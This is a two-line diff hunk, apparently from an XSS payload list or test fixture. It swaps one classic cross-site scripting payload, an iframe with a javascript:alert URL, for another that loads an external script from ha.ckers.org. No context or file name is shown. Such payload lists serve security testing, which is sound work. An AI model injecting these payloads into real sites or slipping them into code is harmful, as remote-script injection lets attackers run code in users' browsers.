@@ -1,2 +1,1 @@
-"><IFRAME SRC="javascript:alert('XSS');"></IFRAME>
-
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
